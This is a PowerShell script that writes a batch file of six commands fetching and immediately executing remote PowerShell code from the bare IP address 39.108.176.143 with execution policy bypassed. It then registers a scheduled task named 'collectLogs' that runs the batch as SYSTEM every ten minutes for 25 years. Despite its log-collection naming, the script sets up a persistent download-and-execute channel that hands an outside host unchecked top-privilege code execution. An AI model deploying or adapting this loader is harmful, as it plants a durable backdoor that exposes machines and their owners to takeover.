
$targetDirectory = "c:\tools2"

if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}

'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/app_sys_sec|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii
'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/tcpvcon2ck|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/autorun|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/sysmon/1|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/sysmon/3|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii -Append
'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/hardware_inventory|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii -Append


$TaskName = "collectLogs"
Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($? -eq $true)
{
    Write-Host "Task $TaskName already exist.try to delete"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
}

# $actions = New-ScheduledTaskAction -Execute 'powershell -executionPolicy ByPass -Command "irm 39.108.176.143/tcpvcon|iex"'

$actions = New-ScheduledTaskAction -Execute 'cmd /c c:\tools2\tcpvcon2ck.bat'


$TheDate= ([DateTime]::Now)
$Duration = $TheDate.AddYears(25) -$TheDate

$trigger = New-ScheduledTaskTrigger -Once -At(Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration $Duration
$principal = New-ScheduledTaskPrincipal -UserId 'system' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun
$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings

Register-ScheduledTask $TaskName -InputObject $task